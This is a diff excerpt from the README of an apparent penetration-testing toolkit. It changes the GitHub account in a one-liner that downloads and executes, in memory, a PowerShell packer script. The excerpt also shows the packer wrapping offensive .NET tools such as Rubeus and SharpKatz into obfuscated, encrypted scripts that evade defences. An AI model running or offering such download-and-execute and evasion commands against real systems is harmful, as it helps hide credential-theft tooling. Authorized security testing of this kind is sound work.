@@ -17,7 +17,7 @@ It generates an obfuscated and encrypted PowerShell script that contains the (C#
   - STEP 1. Generate an obfuscated & encrypted PowerShell script that contains your (C#) .NET executable file (e.g. Rubeus.exe, Sharpkatz.exe) stored locally or on a remote web server.  
 ```
 [*] First load the packer
-    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-SharpPacker/Invoke-PoSH-CsharpPacker.ps1');
+    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JFR-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-SharpPacker/Invoke-PoSH-CsharpPacker.ps1');
 
 [*] Then "pack/obfuscate" a (C#) .NET executable file stored locally (with or without the sandbox checks enabled)
     PS C:\> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
